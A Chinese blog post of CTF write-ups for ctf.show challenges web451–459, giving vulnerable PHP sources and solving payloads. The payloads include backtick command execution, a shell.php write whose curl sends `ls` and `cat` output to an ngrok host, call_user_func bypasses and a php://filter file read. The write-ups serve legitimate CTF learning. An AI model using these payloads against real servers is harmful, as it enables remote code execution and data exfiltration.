<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415162912608.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220415162912608"></p>

<h1 id="web451"><a href="#web451" class="headerlink" title="web451"></a>web451</h1><pre><code class="php"> &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-02-03 22:57:52
 Last Modified by:   h1xa
 Last Modified time: 2021-02-04 15:38:05
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

highlight_file(__FILE__);
$ctfshow=$_GET[&#39;ctfshow&#39;];


if(preg_match(&#39;/^[a-z]+[\^][a-z]+[\^][a-z]+$/&#39;, $ctfshow))&#123;
    if(!preg_match(&#39;/phpinfo/&#39;, $ctfshow))&#123;
        eval(&quot;($ctfshow)();&quot;);
    &#125;
&#125;


Notice: Undefined index: ctfshow in /var/www/html/index.php on line 15
</code></pre>
<pre><code class="php">?ctfshow=phpanfo^phpznfo^phprnfo
</code></pre>
<h1 id="web452"><a href="#web452" class="headerlink" title="web452"></a>web452</h1><pre><code class="php"> &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-02-03 22:57:52
 Last Modified by:   h1xa
 Last Modified time: 2021-02-04 16:05:23
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

highlight_file(__FILE__);
$ctfshow=$_GET[&#39;ctfshow&#39;];


if(!preg_match(&#39;/\&#39;|\&quot;|[0-9]|\&#123;|\[|\~|\^|phpinfo|\$/i&#39;, $ctfshow))&#123;
    eval($ctfshow);
&#125;
</code></pre>
<pre><code class="php">?ctfshow=echo `cat /f*`;
</code></pre>
<pre><code class="php">?ctfshow=((p).(h).(p).(i).(n).(f).(o))();
</code></pre>
<h1 id="web453"><a href="#web453" class="headerlink" title="web453"></a>web453</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415163540538.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220415163540538"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415163659803.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220415163659803"></p>

<p>index.php</p>
<pre><code class="php">
&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-02-04 22:43:04
 Last Modified by:   h1xa
 Last Modified time: 2021-02-05 02:03:03
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


$http = new Swoole\Http\Server(&#39;0.0.0.0&#39;, 80);

$http-&gt;on(&#39;start&#39;, function ($server) &#123;
    echo &quot;Swoole http server is started at http://0.0.0.0:80\n&quot;;
&#125;);

$http-&gt;on(&#39;request&#39;, function ($request, $response) &#123;
    list($controller, $action) = explode(&#39;/&#39;, trim($request-&gt;server[&#39;request_uri&#39;], &#39;/&#39;));
    $route = array(&#39;ctf&#39;);
    $method = array(&#39;show&#39;,&#39;file&#39;,&#39;exec&#39;);
    if(in_array($controller, $route) &amp;&amp; in_array($action, $method))&#123;
        (new $controller)-&gt;$action($request, $response);
    &#125;else&#123;
         $response-&gt;end(&#39;&lt;h3&gt;where is flag?&lt;/h3&gt;&lt;!--/ctf/show?s=XXX  file_get_contents($_POST[\&#39;s\&#39;])--&gt;&#39;);
    &#125;
    
&#125;);
$http-&gt;start();

class ctf&#123;
    public function show($request,$response)&#123;
         $response-&gt;header(&#39;Content-Type&#39;, &#39;text/html; charset=utf-8&#39;);
         $s=$request-&gt;post[&#39;s&#39;];
         if(isset($s))&#123;
             $response-&gt;end(file_get_contents($s));
         &#125;else&#123;
             $response-&gt;end(&#39;s not found&#39;);
         &#125;
    &#125;
    public function file($request,$response)&#123;
          $response-&gt;header(&#39;Content-Type&#39;, &#39;text/html; charset=utf-8&#39;);
         $s=$request-&gt;post[&#39;s&#39;];
         if(isset($s))&#123;
             file_put_contents(&#39;shell.php&#39;, $s);
             $response-&gt;end(&#39;file write done in /var/www/shell.php&#39;);
         &#125;else&#123;
             $response-&gt;end(&#39;s not found&#39;);
         &#125;
    &#125;
    public function exec($request,$response)&#123;
        system(&#39;php shell.php&#39;);
        $response-&gt;end(&#39;command exec done&#39;);
    &#125;
&#125;
</code></pre>
<p>当我们访问&#x2F;ctf&#x2F;file post传入的s会写入shell.php中，然后当我们访问&#x2F;ctf&#x2F;exec时，就会去执行刚才的shell.php</p>
<pre><code class="php">http://d19ab105-9db8-47bd-8ef4-72f1f35bbd19.challenge.ctf.show/ctf/file
POST
s=&lt;?php system(&#39;curl http://b423-111-17-194-91.ngrok.io?1=`ls`&#39;); ?&gt;
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415173649654.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220415173649654"></p>

<pre><code class="php">http://d19ab105-9db8-47bd-8ef4-72f1f35bbd19.challenge.ctf.show/ctf/exec
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415173726802.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220415173726802"></p>

<pre><code class="php">http://d19ab105-9db8-47bd-8ef4-72f1f35bbd19.challenge.ctf.show/ctf/file
POST
s=&lt;?php system(&#39;curl http://b423-111-17-194-91.ngrok.io?1=`cat flaaag`&#39;); ?&gt;
    
 http://d19ab105-9db8-47bd-8ef4-72f1f35bbd19.challenge.ctf.show/ctf/exec   
</code></pre>
<h1 id="web454"><a href="#web454" class="headerlink" title="web454"></a>web454</h1><pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-02-04 22:43:04
 Last Modified by:   h1xa
 Last Modified time: 2021-02-05 03:36:52
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


$http = new Swoole\Http\Server(&#39;0.0.0.0&#39;, 80);

$http-&gt;on(&#39;start&#39;, function ($server) &#123;
    echo &quot;Swoole http server is started at http://0.0.0.0:80\n&quot;;
&#125;);

$http-&gt;on(&#39;request&#39;, function ($request, $response) &#123;
    list($controller, $action) = explode(&#39;/&#39;, trim($request-&gt;server[&#39;request_uri&#39;], &#39;/&#39;));
    $route = array(&#39;ctf&#39;);
    $method = array(&#39;show&#39;,&#39;file&#39;,&#39;include&#39;);
    if(in_array($controller, $route) &amp;&amp; in_array($action, $method))&#123;
        (new $controller)-&gt;$action($request, $response);
    &#125;else&#123;
         $response-&gt;end(&#39;&lt;h3&gt;where is flag?&lt;/h3&gt;&lt;!--/ctf/show?s=XXX  file_get_contents($_POST[\&#39;s\&#39;])--&gt;&#39;);
    &#125;
    
&#125;);
$http-&gt;start();

class ctf&#123;
    public function show($request,$response)&#123;
         $response-&gt;header(&#39;Content-Type&#39;, &#39;text/html; charset=utf-8&#39;);
         $s=$request-&gt;post[&#39;s&#39;];
         if(isset($s))&#123;
             $response-&gt;end(file_get_contents($s));
         &#125;else&#123;
             $response-&gt;end(&#39;s not found&#39;);
         &#125;
    &#125;
    public function file($request,$response)&#123;
          $response-&gt;header(&#39;Content-Type&#39;, &#39;text/html; charset=utf-8&#39;);
         $s=$request-&gt;post[&#39;s&#39;];
         if(isset($s))&#123;
             file_put_contents(&#39;shell.php&#39;, $s);
             $response-&gt;end(&#39;file write done in /var/www/shell.php&#39;);
         &#125;else&#123;
             $response-&gt;end(&#39;s not found&#39;);
         &#125;
    &#125;
    public function include($request,$response)&#123;
        include(&#39;shell.php&#39;);
        $response-&gt;end(&#39;include done&#39;);
    &#125;
&#125;
</code></pre>
<pre><code class="php">http://1a1b05f6-a873-4664-9c86-947cfdad9243.challenge.ctf.show/ctf/file
POST
s=&lt;?php system(&#39;curl http://b423-111-17-194-91.ngrok.io?1=`ls`&#39;); ?&gt;
http://1a1b05f6-a873-4664-9c86-947cfdad9243.challenge.ctf.show/ctf/include
</code></pre>
<pre><code class="php">http://1a1b05f6-a873-4664-9c86-947cfdad9243.challenge.ctf.show//ctf/file
POST
s=&lt;?php system(&#39;curl http://b423-111-17-194-91.ngrok.io?1=`cat flaaags`&#39;); ?&gt;
http://1a1b05f6-a873-4664-9c86-947cfdad9243.challenge.ctf.show/ctf/include
</code></pre>
<h1 id="web455-456"><a href="#web455-456" class="headerlink" title="web455-456"></a>web455-456</h1><pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-02-04 22:43:04
 Last Modified by:   h1xa
 Last Modified time: 2021-02-05 04:11:50
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


$http = new Swoole\Http\Server(&#39;0.0.0.0&#39;, 80);

$http-&gt;on(&#39;start&#39;, function ($server) &#123;
    echo &quot;Swoole http server is started at http://0.0.0.0:80\n&quot;;
&#125;);

$http-&gt;on(&#39;request&#39;, function ($request, $response) &#123;
    list($controller, $action) = explode(&#39;/&#39;, trim($request-&gt;server[&#39;request_uri&#39;], &#39;/&#39;));
    $route = array(&#39;ctf&#39;);
    $method = array(&#39;show&#39;,&#39;file&#39;,&#39;exec&#39;,&#39;reload&#39;);
    if(in_array($controller, $route) &amp;&amp; in_array($action, $method))&#123;
        (new $controller)-&gt;$action($request, $response);
    &#125;else&#123;
         $response-&gt;end(&#39;&lt;h3&gt;where is flag?&lt;/h3&gt;&lt;!--/ctf/show?s=XXX  file_get_contents($_POST[\&#39;s\&#39;])--&gt;&#39;);
    &#125;
    
&#125;);
$http-&gt;start();

class ctf&#123;
    public function show($request,$response)&#123;
         $response-&gt;header(&#39;Content-Type&#39;, &#39;text/html; charset=utf-8&#39;);
         $s=$request-&gt;post[&#39;s&#39;];
         if(isset($s))&#123;
             $response-&gt;end(file_get_contents($s));
         &#125;else&#123;
             $response-&gt;end(&#39;s not found&#39;);
         &#125;
    &#125;
    public function file($request,$response)&#123;
          $response-&gt;header(&#39;Content-Type&#39;, &#39;text/html; charset=utf-8&#39;);
         $s=$request-&gt;post[&#39;s&#39;];
         if(isset($s))&#123;
             file_put_contents(&#39;shell.php&#39;, $s);
             $response-&gt;end(&#39;file write done in /var/www/shell.php&#39;);
         &#125;else&#123;
             $response-&gt;end(&#39;s not found&#39;);
         &#125;
    &#125;
    public function exec($request,$response)&#123;
        system(&#39;php shell.php&#39;);
        $response-&gt;end(&#39;include done&#39;);
    &#125;
    public function reload($request,$response)&#123;
        global $http;
        $http-&gt;reload();
        $response-&gt;end(&#39;reload done&#39;);
    &#125;
&#125;
</code></pre>
<pre><code class="php">http://95378ee8-e4ba-4b44-8668-06cc49739290.challenge.ctf.show/ctf/file
POST
s=&lt;?php system(&#39;curl http://b423-111-17-194-91.ngrok.io?1=`ls`&#39;); ?&gt;
http://95378ee8-e4ba-4b44-8668-06cc49739290.challenge.ctf.show//ctf/exec
http://95378ee8-e4ba-4b44-8668-06cc49739290.challenge.ctf.show/ctf/file
POST
s=&lt;?php system(&#39;curl http://b423-111-17-194-91.ngrok.io?1=`cat flsaaag`&#39;); ?&gt;
http://95378ee8-e4ba-4b44-8668-06cc49739290.challenge.ctf.show//ctf/exec
</code></pre>
<h1 id="web457"><a href="#web457" class="headerlink" title="web457"></a>web457</h1><pre><code class="php"> &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-02-06 01:58:32
 Last Modified by:   h1xa
 Last Modified time: 2021-02-06 12:19:36
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

highlight_file(__FILE__);
error_reporting(0);
include(&#39;flag.php&#39;);
abstract class user&#123;
    public  $username;
    public  $password;
    function __construct($u,$p)&#123;
        $this-&gt;username=$u;
        $this-&gt;password=$p;
    &#125;
    abstract  public  function check();
&#125;

class visitor extends user&#123;
    public  function check()&#123;
        return ($this-&gt;username!==&#39;admin&#39; &amp;&amp; $this-&gt;password!==&#39;admin888&#39;);
    &#125;
&#125;

class admin extends user&#123;
    public  function check()&#123;
        $u= call_user_func($this-&gt;password);
        return $u==&#39;admin&#39;;
    &#125;
&#125;


$u=$_GET[&#39;u&#39;];
$p=$_GET[&#39;p&#39;];

if(isset($u)&amp;&amp;isset($p))&#123;
    if((new visitor($u,$p))-&gt;check())&#123;
        die(&#39;welcome visitor :&#39;.$u);
    &#125;
    if((new admin($u,$p))-&gt;check())&#123;
        die(&#39;welcome admin :&#39;.$u.&#39; flag is :&#39;.$flag);
    &#125;
&#125; 
</code></pre>
<pre><code class="php">?u=admin&amp;p=phpinfo
</code></pre>
<p>先进入第二个语句,phpinfo执行结果为true</p>
<h1 id="web458"><a href="#web458" class="headerlink" title="web458"></a>web458</h1><pre><code class="php"> &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-02-06 01:58:32
 Last Modified by:   h1xa
 Last Modified time: 2021-02-06 12:19:36
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

highlight_file(__FILE__);
error_reporting(0);
include(&#39;flag.php&#39;);
abstract class user&#123;
    public  $username;
    public  $password;
    function __construct($u,$p)&#123;
        $this-&gt;username=$u;
        $this-&gt;password=$p;
    &#125;
    abstract  public  function check();
&#125;

class visitor extends user&#123;
    public  function check()&#123;
        return ($this-&gt;username!==&#39;admin&#39; &amp;&amp; $this-&gt;password!==&#39;admin888&#39;);
    &#125;
&#125;

class admin extends user&#123;
    public  function check()&#123;
        $u= call_user_func($this-&gt;password);
        return $u===&#39;admin&#39;;
    &#125;
&#125;


$u=$_GET[&#39;u&#39;];
$p=$_GET[&#39;p&#39;];

if(isset($u)&amp;&amp;isset($p))&#123;
    if((new visitor($u,$p))-&gt;check())&#123;
        die(&#39;welcome visitor :&#39;.$u);
    &#125;
    if((new admin($u,$p))-&gt;check())&#123;
        die(&#39;welcome admin :&#39;.$u.&#39; flag is :&#39;.$flag);
    &#125;
&#125;
</code></pre>
<pre><code class="php">?u=admin&amp;p=get_class
</code></pre>
<pre><code class="hp">get_class (): 获取当前调用方法的类名； 
get_called_class():获取静态绑定后的类名；
</code></pre>
<h1 id="web459"><a href="#web459" class="headerlink" title="web459"></a>web459</h1><pre><code class="php"> &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-02-06 01:58:32
 Last Modified by:   h1xa
 Last Modified time: 2021-02-06 13:25:16
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

highlight_file(__FILE__);
error_reporting(0);
include(&#39;flag.php&#39;);


$u=$_GET[&#39;u&#39;];
$p=$_GET[&#39;p&#39;];

if(isset($u)&amp;&amp;isset($p))&#123;
    copy($u, $p.&#39;.php&#39;);
&#125; 
</code></pre>
<pre><code class="php">?u=php://filter/convert.base64-encode/resource=flag.php&amp;p=1
</code></pre>
<p>直接读取读不到php文件,所以进行一下base64编码</p>

	</div>

	

	

	
		<div class="post-tags">
			<i class="fa fa-tags" aria-hidden="true"></i>
			<a class="tag badge badge-secondary post-meta-detail-tag -none-link" href="/tags/ctf-show/" rel="tag">ctf.show</a>
		</div>
	
</article>

	<div id="share_container">
	<div id="share" data-initialized="true">
		<a class="no-pjax icon-wechat" tooltip="分享到微信">
			<button class="btn btn-icon btn-success">
				<span class="btn-inner--icon"><i class="fa fa-weixin"></i></span>
			</button>
		</a>
		<a target="_blank" class="no-pjax icon-douban" tooltip="分享到豆瓣">
			<button class="btn btn-icon btn-primary" style="background: #209261;border: none;">
				豆
			</button>
		</a>
		<a target="_blank" class="no-pjax icon-qq" tooltip="分享到 QQ">
			<button class="btn btn-icon btn-primary" style="background: #2196f3;border: none;">
				<span class="btn-inner--icon"><i class="fa fa-qq"></i></span>
			</button>
		</a>
		<a target="_blank" class="no-pjax icon-qzone" tooltip="分享到 QQ 空间">
			<button class="btn btn-icon btn-primary" style="background: #ffc107;border: none;">
				<span class="btn-inner--icon"><i class="fa fa-star"></i></span>
			</button>
		</a>
		<a target="_blank" class="no-pjax icon-weibo" tooltip="分享到微博">
			<button class="btn btn-icon btn-warning">
				<span class="btn-inner--icon"><i class="fa fa-weibo"></i></span>
			</button>
		</a>
		<a target="_blank" class="no-pjax icon-facebook" tooltip="分享到 Facebook">
			<button class="btn btn-icon btn-primary" style="background: #283593;border: none;">
				<span class="btn-inner--icon"><i class="fa fa-facebook"></i></span>
			</button>
		</a>
		<a target="_blank" class="no-pjax icon-twitter" tooltip="分享到 Twitter">
			<button class="btn btn-icon btn-primary" style="background: #03a9f4;border: none;">
				<span class="btn-inner--icon"><i class="fa fa-twitter"></i></span>
			</button>
		</a>
		<a target="_blank" class="no-pjax icon-telegram" href="https://telegram.me/share/url?url=https://lovewanan.github.io/ctfshow/ctf.show/%E5%85%B6%E4%BB%96/&text=其他" tooltip="分享到 Telegram">
			<button class="btn btn-icon btn-primary" style="background: #42a5f5;border: none;">
				<span class="btn-inner--icon"><i class="fa fa-telegram"></i></span>
			</button>
		</a>
		<a target="_blank" class="no-pjax icon-copy-link" id="share_copy_link" tooltip="复制链接">
			<button class="btn btn-icon btn-default">
				<span class="btn-inner--icon"><i class="fa fa-link"></i></span>
			</button>
		</a>
	</div>
	<button id="share_show" class="btn btn-icon btn-primary" tooltip="分享">
		<span class="btn-inner--icon"><i class="fa fa-share"></i></span>
	</button>
</div>
<script type="text/javascript">
	socialShare("#share", {
	    title : '其他',
	    description : 'web396 &amp;lt;?php

/*
# -*- coding: utf-8 -*-
 Autho...',
	    wechatQrcodeTitle : "分享到微信",
	    wechatQrcodeHelper : '微信扫描二维码',
	    source : 'https://lovewanan.github.io/ctfshow/ctf.show/%E5%85%B6%E4%BB%96/'
	});
	$("#share_show")[0].onclick = function(){
		$("#share_container").addClass("opened");
	};
	$("#share_copy_link")[0].onclick = function(){
		let input = document.createElement('input');
		document.body.appendChild(input);
		input.setAttribute("value", window.location.href);
		input.setAttribute("readonly", "readonly");
		input.setAttribute("style", "opacity: 0;mouse-events:none;");
		input.select();
		if (document.execCommand('copy')){
			iziToast.show({
				title: '链接已复制',
				message: "链接已复制到剪贴板",
				class: 'shadow',
				position: 'topRight',
				backgroundColor: '#2dce89',
				titleColor: '#ffffff',
				messageColor: '#ffffff',
				iconColor: '#ffffff',
				progressBarColor: '#ffffff',
				icon: 'fa fa-check',
				timeout: 5000
			});
		}else{
			iziToast.show({
				title: '复制失败',
				message: "请手动复制链接",
				class: 'shadow',
				position: 'topRight',
				backgroundColor: '#f5365c',
				titleColor: '#ffffff',
				messageColor: '#ffffff',
				iconColor: '#ffffff',
				progressBarColor: '#ffffff',
				icon: 'fa fa-close',
				timeout: 5000
			});
		}
		document.body.removeChild(input);
	};
</script>




	<div id="post_comment" class="card shadow-sm">
		<div id="waline"></div>
<script>
  Waline({
	el: '#waline',
	serverURL: 'https://waline-jaua9chtw-lovewanan.vercel.app',
  });
</script>

	</div>


<div class="post-navigation card shadow-sm"><div class="post-navigation-item post-navigation-pre"><span class="page-navigation-extra-text"><i class="fa fa-arrow-circle-o-left" aria-hidden="true"></i>上一篇</span><a href="/ctfshow/ctf.show/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="prev"> 反序列化</a></div><div class="post-navigation-item post-navigation-next"><span class="page-navigation-extra-text">下一篇 <i class="fa fa-arrow-circle-o-right" aria-hidden="true"></i></span><a href="/ctfshow/ctf.show/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="next"> 信息收集</a></div></div>




		
		
		
		

					<footer id="footer" class="site-footer card shadow-sm border-0">
						
						<div>Theme <a target="_blank" rel="noopener" href="https://github.com/solstice23/hexo-theme-argon"><strong>Argon</strong></a> | Powered by Hexo</div>
						<span id="busuanzi_container_site_uv">
							本站访客数 <span id="busuanzi_value_site_uv"></span> 人次
						</span>
					</footer>
				</main>
			</div>
		</div>
		
<script src="/argontheme.js"></script>

		
		
		

		
			<script>
				var argonEnableCodeHighlight = true;
			</script>
			
<link rel="stylesheet" href="/assets/vendor/highlight/styles/github-gist.css">

		

	</div>
</div>
<noscript>
	<style>
		article img.lazyload[src^="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPg"]{display: none;}
		.comment-item-text .comment-sticker.lazyload{display: none;}
	</style>
</noscript>
</body>



</html>

